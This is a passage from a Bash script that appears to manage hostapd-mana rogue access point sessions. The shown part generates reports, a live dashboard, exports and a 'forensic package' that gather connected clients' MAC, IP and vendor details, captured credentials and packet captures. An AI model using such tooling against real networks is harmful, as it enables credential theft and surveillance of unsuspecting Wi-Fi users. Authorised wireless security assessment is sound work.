    log_message "SUCCESS" "Report initialization complete: $REPORT_DIR"
}

# Calculate session statistics
calculate_statistics() {
    local stats_file="$SESSION_DIR/statistics.json"
    
    # Count total clients
    local total_clients=0
    if [[ -f "$SESSION_DIR/clients.log" ]]; then
        total_clients=$(grep -c "CONNECTED" "$SESSION_DIR/clients.log" 2>/dev/null || echo "0")
    fi
    
    # Count unique vendors
    local unique_vendors=0
    if [[ -f "$SESSION_DIR/clients.log" ]]; then
        unique_vendors=$(awk '/CONNECTED/ {for(i=7;i<=NF;i++) printf "%s ", $i; print ""}' "$SESSION_DIR/clients.log" 2>/dev/null | sort -u | wc -l)
    fi
    
    # Count captured credentials
    local captured_creds=0
    if [[ -f "$SESSION_DIR/hostapd.credout" ]]; then
        captured_creds=$(wc -l < "$SESSION_DIR/hostapd.credout" 2>/dev/null || echo "0")
    fi
    
    # Estimate data transferred (simplified)
    local data_transferred="0"
    if [[ -f "$SESSION_DIR/dnsmasq.log" ]]; then
        data_transferred=$(wc -l < "$SESSION_DIR/dnsmasq.log" 2>/dev/null || echo "0")
        data_transferred=$((data_transferred / 1000))  # Rough estimate in MB
    fi
    
    # Save statistics
    cat > "$stats_file" << EOF
{
    "total_clients": $total_clients,
    "unique_vendors": $unique_vendors,
    "captured_credentials": $captured_creds,
    "data_transferred": $data_transferred
}
EOF
    
    echo "$total_clients,$unique_vendors,$captured_creds,$data_transferred"
}

# Generate comprehensive HTML report
generate_html_report() {
    log_message "INFO" "Generating comprehensive HTML report..."
    
    # Initialize report
    initialize_report
    
    # Calculate statistics
    local stats=($(calculate_statistics))
    local total_clients="${stats[0]}"
    local unique_vendors="${stats[1]}"
    local captured_creds="${stats[2]}"
    local data_transferred="${stats[3]}"
    
    # Determine session times
    local start_time=$(head -2 "$LOG_FILE" | tail -1 | grep -o '[0-9-]* [0-9:]*')
    local end_time=$(date '+%Y-%m-%d %H:%M:%S')
    
    # Determine security type
    local security="Open Network"
    [[ -n "$PASSWORD" ]] && security="WPA2 Protected"
    
    # Generate the complete HTML report
    {
        generate_html_head "MANA Session Report - $SESSION_ID"
        generate_session_summary "$SESSION_ID" "$start_time" "$end_time" "$INTERFACE" "$SSID" "$security"
        generate_statistics_section "$total_clients" "$unique_vendors" "$captured_creds" "$data_transferred"
        generate_client_table "$SESSION_DIR/clients.log"
        generate_network_diagram "$INTERFACE" "$SSID" "$total_clients"
        generate_credentials_section "$SESSION_DIR/hostapd.credout"
        generate_timeline_section "$LOG_FILE"
        generate_export_section "$SESSION_DIR"
        
        cat << 'EOF'
    <div class="footer">
        <p>Report generated by hostapd-mana Professional Manager</p>
        <p>Session completed at: {{END_TIME}}</p>
        <p>⚠️ This report contains sensitive security assessment data - Handle with care</p>
    </div>
</div>

EOF
        
        generate_javascript "$total_clients"
        
        cat << 'EOF'
</body>
</html>
EOF
        
    } > "$REPORT_FILE"
    
    # Replace template variables
    sed -i "s/{{END_TIME}}/$end_time/g" "$REPORT_FILE"
    
    log_message "SUCCESS" "HTML report generated: $REPORT_FILE"
}

# Generate live dashboard
generate_live_dashboard() {
    log_message "INFO" "Generating live dashboard..."
    
    local stats=($(calculate_statistics))
    local total_clients="${stats[0]}"
    local unique_vendors="${stats[1]}"
    local captured_creds="${stats[2]}"
    local data_transferred="${stats[3]}"
    
    {
        generate_html_head "MANA Live Dashboard - $SESSION_ID"
        
        cat << EOF
<div class="container">
    <div class="header">
        <h1>🔴 LIVE: hostapd-mana Dashboard</h1>
        <div class="subtitle">Real-time monitoring - Session: $SESSION_ID</div>
        
        <div class="session-info">
            <div class="info-card">
                <h3>Status</h3>
                <div class="value">🟢 ACTIVE</div>
            </div>
            <div class="info-card">
                <h3>SSID</h3>
                <div class="value">$SSID</div>
            </div>
            <div class="info-card">
                <h3>Interface</h3>
                <div class="value">$INTERFACE</div>
            </div>
            <div class="info-card">
                <h3>Uptime</h3>
                <div class="value" id="uptime">00:00:00</div>
            </div>
        </div>
    </div>

    <div class="section">
        <h2>📊 Live Statistics</h2>
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="live-clients">$total_clients</div>
                <div class="stat-label">Connected Clients</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="live-vendors">$unique_vendors</div>
                <div class="stat-label">Device Vendors</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="live-creds">$captured_creds</div>
                <div class="stat-label">Captured Creds</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="live-data">$data_transferred MB</div>
                <div class="stat-label">Data Processed</div>
            </div>
        </div>
    </div>

    <div class="section">
        <h2>👥 Recent Client Activity</h2>
        <div id="recent-clients">
EOF
        
        # Show last 10 client connections
        if [[ -f "$SESSION_DIR/clients.log" ]]; then
            tail -10 "$SESSION_DIR/clients.log" | grep "CONNECTED" | while IFS= read -r line; do
                local timestamp=$(echo "$line" | awk '{print $1, $2}')
                local mac=$(echo "$line" | awk '{print $3}')
                local ip=$(echo "$line" | awk '{print $4}')
                local vendor=$(echo "$line" | awk '{for(i=7;i<=NF;i++) printf "%s ", $i}')
                
                cat << EOF
            <div class="timeline-item">
                <div class="timeline-time">$timestamp</div>
                <div class="timeline-event">New client: $mac ($ip) - $vendor</div>
            </div>
EOF
            done
        fi
        
        cat << 'EOF'
        </div>
    </div>

    <div class="footer">
        <p>🔴 Live Dashboard - Auto-refreshes every 30 seconds</p>
        <p id="last-update">Last updated: <span id="update-time"></span></p>
    </div>
</div>

<script>
    let startTime = new Date();
    
    function updateUptime() {
        const now = new Date();
        const diff = now - startTime;
        const hours = Math.floor(diff / 3600000);
        const minutes = Math.floor((diff % 3600000) / 60000);
        const seconds = Math.floor((diff % 60000) / 1000);
        
        document.getElementById('uptime').textContent = 
            String(hours).padStart(2, '0') + ':' +
            String(minutes).padStart(2, '0') + ':' +
            String(seconds).padStart(2, '0');
    }
    
    function updateTimestamp() {
        document.getElementById('update-time').textContent = new Date().toLocaleTimeString();
    }
    
    // Update every second
    setInterval(updateUptime, 1000);
    setInterval(updateTimestamp, 1000);
    
    // Refresh page every 30 seconds for live data
    setInterval(() => {
        location.reload();
    }, 30000);
    
    // Initial timestamp
    updateTimestamp();
</script>

</body>
</html>
EOF
        
    } > "$DASHBOARD_FILE"
    
    log_message "SUCCESS" "Live dashboard generated: $DASHBOARD_FILE"
}

# Generate summary report for terminal
generate_summary_report() {
    local stats=($(calculate_statistics))
    local total_clients="${stats[0]}"
    local unique_vendors="${stats[1]}"
    local captured_creds="${stats[2]}"
    local data_transferred="${stats[3]}"
    
    cat << EOF

${BOLD}${CYAN}════════════════════════════════════════════════════════════════${NC}
${BOLD}${WHITE}                    SESSION SUMMARY REPORT                     ${NC}
${BOLD}${CYAN}════════════════════════════════════════════════════════════════${NC}

${BOLD}Session Information:${NC}
  📋 Session ID: ${YELLOW}$SESSION_ID${NC}
  🌐 Interface: ${CYAN}$INTERFACE${NC}
  📡 SSID: ${GREEN}$SSID${NC}
  🔒 Security: $([ -n "$PASSWORD" ] && echo "${GREEN}WPA2 Protected${NC}" || echo "${YELLOW}Open Network${NC}")
  ⏱️  Duration: ${PURPLE}$(printf "%02d:%02d:%02d" $((($(date +%s) - $(stat -c %Y "$LOG_FILE")) / 3600)) $(((($(date +%s) - $(stat -c %Y "$LOG_FILE")) % 3600) / 60)) $((($(date +%s) - $(stat -c %Y "$LOG_FILE")) % 60)))${NC}

${BOLD}Statistics:${NC}
  👥 Total Clients Connected: ${CYAN}$total_clients${NC}
  🏭 Unique Device Vendors: ${CYAN}$unique_vendors${NC}
  🔐 Captured Credentials: ${RED}$captured_creds${NC}
  📊 Data Transferred: ${CYAN}$data_transferred MB${NC}

${BOLD}Files Generated:${NC}
  📄 Session Log: ${SESSION_DIR}/session.log
  👥 Client Log: ${SESSION_DIR}/clients.log
  🔧 hostapd Log: ${SESSION_DIR}/hostapd.log
  📊 HTML Report: ${REPORT_FILE}
  🔴 Live Dashboard: ${DASHBOARD_FILE}

${BOLD}${GREEN}HTML Report URL:${NC}
  file://$REPORT_FILE

EOF

    if [[ $captured_creds -gt 0 ]]; then
        echo -e "${BOLD}${RED}⚠️  SECURITY ALERT:${NC}"
        echo -e "  ${RED}$captured_creds credentials were captured during this session!${NC}"
        echo -e "  ${YELLOW}Check: $SESSION_DIR/hostapd.credout${NC}"
        echo ""
    fi
    
    if [[ $total_clients -eq 0 ]]; then
        echo -e "${BOLD}${YELLOW}📝 Note:${NC}"
        echo -e "  ${YELLOW}No clients connected during this session.${NC}"
        echo -e "  ${YELLOW}Consider adjusting SSID or security settings.${NC}"
        echo ""
    fi
}

#=============================================================================
# EXPORT & FORENSIC FUNCTIONS
#=============================================================================

# Generate forensic package
generate_forensic_package() {
    local package_file="$SESSION_DIR/${SESSION_ID}_forensic_package.tar.gz"
    
    log_message "INFO" "Creating forensic evidence package..."
    
    # Create temporary directory for package contents
    local temp_dir=$(mktemp -d)
    local package_dir="$temp_dir/${SESSION_ID}_evidence"
    mkdir -p "$package_dir"
    
    # Copy all relevant files
    [[ -f "$SESSION_DIR/session.log" ]] && cp "$SESSION_DIR/session.log" "$package_dir/"
    [[ -f "$SESSION_DIR/clients.log" ]] && cp "$SESSION_DIR/clients.log" "$package_dir/"
    [[ -f "$SESSION_DIR/hostapd.log" ]] && cp "$SESSION_DIR/hostapd.log" "$package_dir/"
    [[ -f "$SESSION_DIR/hostapd.credout" ]] && cp "$SESSION_DIR/hostapd.credout" "$package_dir/"
    [[ -f "$SESSION_DIR/dnsmasq.log" ]] && cp "$SESSION_DIR/dnsmasq.log" "$package_dir/"
    [[ -d "$SESSION_DIR/report" ]] && cp -r "$SESSION_DIR/report" "$package_dir/"
    
    # Copy individual client files
    for client_file in "$SESSION_DIR"/client_*.log; do
        [[ -f "$client_file" ]] && cp "$client_file" "$package_dir/"
    done
    
    # Copy packet captures
    for pcap_file in "$SESSION_DIR"/client_*.pcap; do
        [[ -f "$pcap_file" ]] && cp "$pcap_file" "$package_dir/"
    done
    
    # Generate evidence manifest
    cat > "$package_dir/MANIFEST.txt" << EOF
FORENSIC EVIDENCE PACKAGE
========================

Session ID: $SESSION_ID
Generated: $(date)
Operator: $(whoami)
Hostname: $(hostname)
Interface: $INTERFACE
SSID: $SSID

Files included:
$(find "$package_dir" -type f -not -name "MANIFEST.txt" | sort)

Checksums (SHA256):
$(find "$package_dir" -type f -not -name "MANIFEST.txt" -exec sha256sum {} \;)

Chain of Custody:
- Package created: $(date)
- Created by: $(whoami)@$(hostname)
- Package integrity: $(tar -czf - "$package_dir" | sha256sum | cut -d' ' -f1)
EOF
    
    # Create compressed package
    (cd "$temp_dir" && tar -czf "$package_file" "${SESSION_ID}_evidence/")
    
    # Cleanup
    rm -rf "$temp_dir"
    
    log_message "SUCCESS" "Forensic package created: $package_file"
    echo "$package_file"
}

# Generate CSV export for client data
generate_csv_export() {
    local csv_file="$SESSION_DIR/clients_export.csv"
    
    log_message "INFO" "Generating CSV export..."
    
    # CSV header
    echo "Timestamp,MAC_Address,IP_Address,Hostname,Vendor,Status,First_Seen,Last_Seen" > "$csv_file"
    
    # Process client log
    if [[ -f "$SESSION_DIR/clients.log" ]]; then
        declare -A client_data
        
        # Parse all client events
        while IFS= read -r line; do
            if [[ -n "$line" && ! "$line" =~ ^=+ && ! "$line" =~ ^TIMESTAMP ]]; then
                local timestamp=$(echo "$line" | awk '{print $1 " " $2}')
                local mac=$(echo "$line" | awk '{print $3}')
                local ip=$(echo "$line" | awk '{print $4}')
                local hostname=$(echo "$line" | awk '{print $5}')
                local status=$(echo "$line" | awk '{print $6}')
                local vendor=$(echo "$line" | awk '{for(i=7;i<=NF;i++) printf "%s ", $i}' | sed 's/[[:space:]]*$//')
                
                if [[ "$status" == "CONNECTED" ]]; then
                    client_data["$mac"]="$timestamp,$mac,$ip,$hostname,$vendor,CONNECTED,$timestamp,$timestamp"
                elif [[ "$status" == "DISCONNECTED" ]]; then
                    if [[ -n "${client_data[$mac]:-}" ]]; then
                        # Update last seen time
                        local existing_data="${client_data[$mac]}"
                        client_data["$mac"]="${existing_data%,*},$timestamp"
                    fi
                fi
            fi
        done < "$SESSION_DIR/clients.log"
        
        # Write CSV data
        for mac in "${!client_data[@]}"; do
            echo "${client_data[$mac]}" >> "$csv_file"
        done
    fi
    
    log_message "SUCCESS" "CSV export generated: $csv_file"
    echo "$csv_file"
}

# Generate JSON export
generate_json_export() {
    local json_file="$SESSION_DIR/session_export.json"
    
    log_message "INFO" "Generating JSON export..."
    
    local stats=($(calculate_statistics))
    local start_time=$(head -2 "$LOG_FILE" | tail -1 | grep -o '[0-9-]* [0-9:]*')
    local end_time=$(date '+%Y-%m-%d %H:%M:%S')
    
    cat > "$json_file" << EOF
{
  "session_info": {
    "session_id": "$SESSION_ID",
    "interface": "$INTERFACE",
    "ssid": "$SSID",
    "security": $([ -n "$PASSWORD" ] && echo '"WPA2"' || echo '"Open"'),
    "start_time": "$start_time",
    "end_time": "$end_time",
    "duration_seconds": $(($(date -d "$end_time" +%s) - $(date -d "$start_time" +%s))),
    "operator": "$(whoami)",
    "hostname": "$(hostname)"
  },
  "statistics": {
    "total_clients": ${stats[0]},
    "unique_vendors": ${stats[1]},
    "captured_credentials": ${stats[2]},
    "data_transferred_mb": ${stats[3]}
  },
  "clients": [
EOF
    
    # Add client data
    local first_client=true
    if [[ -f "$SESSION_DIR/clients.log" ]]; then
        while IFS= read -r line; do
            if [[ -n "$line" && ! "$line" =~ ^=+ && ! "$line" =~ ^TIMESTAMP ]]; then
                local timestamp=$(echo "$line" | awk '{print $1 " " $2}')
                local mac=$(echo "$line" | awk '{print $3}')
                local ip=$(echo "$line" | awk '{print $4}')
                local hostname=$(echo "$line" | awk '{print $5}')
                local status=$(echo "$line" | awk '{print $6}')
                local vendor=$(echo "$line" | awk '{for(i=7;i<=NF;i++) printf "%s ", $i}' | sed 's/[[:space:]]*$//')
                
                if [[ "$status" == "CONNECTED" ]]; then
                    [[ "$first_client" == "false" ]] && echo "    }," >> "$json_file"
                    [[ "$first_client" == "true" ]] && first_client=false
                    
                    cat >> "$json_file" << EOF
    {
      "mac_address": "$mac",
      "ip_address": "$ip",
      "hostname": "$hostname",
      "vendor": "$vendor",
      "first_seen": "$timestamp",
      "status": "$status"
EOF
                fi
            fi
        done < "$SESSION_DIR/clients.log"
    fi
    
    [[ "$first_client" == "false" ]] && echo "    }" >> "$json_file"
    
    cat >> "$json_file" << EOF
  ],
  "files": {
    "session_log": "$SESSION_DIR/session.log",
    "client_log": "$SESSION_DIR/clients.log",
    "hostapd_log": "$SESSION_DIR/hostapd.log",
    "html_report": "$REPORT_FILE",
    "credentials": "$SESSION_DIR/hostapd.credout"
  },
  "export_info": {
    "generated": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "generator": "hostapd-mana-manager v$SCRIPT_VERSION",
    "format_version": "1.0"
  }
}
EOF
    
    log_message "SUCCESS" "JSON export generated: $json_file"
    echo "$json_file"
}

#=============================================================================
# MAIN REPORT GENERATION FUNCTION
#=============================================================================

# Generate all reports and exports
generate_all_reports() {
    log_message "INFO" "Generating comprehensive session reports..."
    
    # Generate HTML report
    generate_html_report
    
    # Generate live dashboard (if session is still active)
    if [[ -n "$HOSTAPD_PID" ]] && kill -0 "$HOSTAPD_PID" 2>/dev/null; then
        generate_live_dashboard
    fi
    
    # Generate exports
    local csv_file=$(generate_csv_export)
    local json_file=$(generate_json_export)
    local forensic_package=$(generate_forensic_package)
    
    # Generate terminal summary
    generate_summary_report
    
    # Open HTML report if possible
    if command -v xdg-open &>/dev/null; then
        log_message "INFO" "Opening HTML report in browser..."
        xdg-open "$REPORT_FILE" &>/dev/null &
    elif command -v open &>/dev/null; then
        log_message "INFO" "Opening HTML report in browser..."
        open "$REPORT_FILE" &>/dev/null &
    fi
    
    log_message "SUCCESS" "All reports generated successfully"
    echo -e "\n${BOLD}${GREEN}📊 Reports generated:${NC}"
    echo -e "  📊 HTML Report: $REPORT_FILE"
    echo -e "  🔴 Live Dashboard: $DASHBOARD_FILE"
    echo -e "  📈 CSV Export: $csv_file"
    echo -e "  📋 JSON Export: $json_file"
    echo -e "  📦 Forensic Package: $forensic_package"
}

#=============================================================================
# MAIN INTEGRATION FUNCTION FOR COMPLETE SCRIPT
#=============================================================================

# Main function to run the complete hostapd-mana manager
main() {
    local args=("$@")
    
    # Part 1: Initialize and setup
    parse_arguments "${args[@]}"
    check_root
    check_dependencies
    initialize_session
    
    local hypervisor=$(detect_hypervisor)
    optimize_for_vm "$hypervisor"
    
    # Auto-detect or validate interface
    if [[ -z "$INTERFACE" ]]; then
        INTERFACE=$(auto_detect_interface)
        if [[ $? -ne 0 ]]; then
            cleanup_and_exit 1
        fi
    else
        if ! validate_interface "$INTERFACE"; then
            cleanup_and_exit 1
        fi
    fi
    
    # Validate configuration
    if ! validate_wifi_config "$SSID" "$CHANNEL" "$PASSWORD"; then
        cleanup_and_exit 1
    fi
    
    # Show configuration and get confirmation
    confirm_configuration
    
    # Exit if dry run
    if [[ "$DRY_RUN" == "true" ]]; then
        log_message "SUCCESS" "Dry run completed successfully"
        cleanup_and_exit 0
    fi
    
    # Part 1: Setup network
    backup_network_state
    configure_interface "$INTERFACE"
    
    # Part 2: Configure hostapd and start services
    if [[ -n "$PASSWORD" ]]; then
        generate_wpa2_config "$SSID" "$PASSWORD" "$CHANNEL" "$INTERFACE"
    else
        generate_open_config "$SSID" "$CHANNEL" "$INTERFACE"
    fi
    
    if ! start_hostapd; then
        cleanup_and_exit 1
    fi
    
    if ! setup_dhcp_server; then
        cleanup_and_exit 1
    fi
    
    # Part 2: Start monitoring
    initialize_client_monitoring
    monitor_client_connections "$INTERFACE" &
    MONITOR_PID=$!
    
    log_message "SUCCESS" "hostapd-mana is running successfully!"
    log_message "INFO" "SSID: $SSID | Interface: $INTERFACE | Session: $SESSION_ID"
    log_message "INFO" "Press Ctrl+C to stop and generate reports..."
    
    # Wait for user interruption or process termination
    while kill -0 "$HOSTAPD_PID" 2>/dev/null; do
        # Show live stats every 60 seconds
        sleep 60
        if [[ "$VERBOSE" == "true" ]]; then
            get_client_stats
        fi
        
        # Generate live dashboard periodically
        if [[ -f "$DASHBOARD_FILE" ]]; then
            generate_live_dashboard &>/dev/null
        fi
    done
    
    log_message "ERROR" "hostapd process died unexpectedly"
    cleanup_and_exit 1
}

# Cleanup function that includes report generation
cleanup_and_exit() {
    local exit_code=${1:-0}
    
    log_message "INFO" "Stopping session and generating final reports..."
    MONITORING_ACTIVE=false
    
    # Part 3: Generate reports before cleanup
    if [[ -f "$LOG_FILE" && -s "$LOG_FILE" ]]; then
        generate_all_reports
    fi
    
    # Original cleanup from Part 1
    restore_network_state
    
    # Final log entry
    if [[ -n "$LOG_FILE" && -f "$LOG_FILE" ]]; then
        {
            echo ""
            echo "================================="
            echo "Session ended: $(date)"
            echo "Exit code: $exit_code"
            echo "Reports generated: $REPORT_DIR"
            echo "=== END OF SESSION LOG ==="
        } >> "$LOG_FILE"
    fi
    
    exit "$exit_code"
}

# Execute main function if script is run directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi

# This completes Part 3 and the full hostapd-mana manager script
 
```
